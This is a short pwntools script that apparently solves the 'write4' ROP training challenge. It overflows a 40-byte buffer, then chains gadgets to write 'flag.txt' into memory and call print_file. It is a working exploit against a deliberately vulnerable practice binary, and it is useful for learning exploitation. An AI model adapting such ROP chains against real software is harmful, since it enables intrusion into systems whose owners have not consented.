from pwn import *

p = process('./write4')
e = ELF('./write4')
r = ROP(e)

pop_r14_r15_ret = 0x400690
mov_r14_r15_ret = 0x400628

payload = b'A' * 40
payload += p64(pop_r14_r15_ret)
payload += p64(e.bss())
payload += b'flag.txt'
payload += p64(mov_r14_r15_ret)
payload += p64(r.find_gadget(['pop rdi']).address)
payload += p64(e.bss())
payload += p64(e.symbols['print_file'])
p.send(payload)
p.interactive()